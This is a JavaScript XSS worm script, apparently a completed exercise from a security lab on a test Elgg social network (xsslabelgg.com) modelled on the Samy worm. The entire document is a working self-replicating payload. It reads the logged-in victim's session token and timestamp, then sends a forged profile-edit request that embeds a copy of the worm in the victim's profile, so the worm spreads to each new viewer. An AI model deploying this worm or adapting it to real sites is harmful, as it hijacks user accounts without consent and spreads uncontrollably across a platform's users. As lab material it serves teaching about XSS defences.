<script id=worm>
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode = document.getElementById("worm").innerHTML;
var tailTag = "</" + "script>";	
var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

window.onload = function () {
var userName=elgg.session.user.name;
var guid="&guid="+elgg.session.user.guid;
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;
var worm="&description=test"+wormCode
//Construct the content of your url. 
var content="name="+userName+worm+"&accesslevel[description]=2"+ts+token+guid;	//FILL IN YOUR CODE HERE
var samyGuid="47" //FILL IN YOUR CODE HERE
var sendurl="http://www.xsslabelgg.com/action/profile/edit"
if(elgg.session.user.guid!=samyGuid)								
{
	//Create and send Ajax request to modify profile 
	var Ajax=null;
	Ajax=new XMLHttpRequest(); 
	Ajax.open("POST",sendurl,true); 
	Ajax.setRequestHeader("Host","www.xsslabelgg.com"); 
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send(content);
}
}
</script>

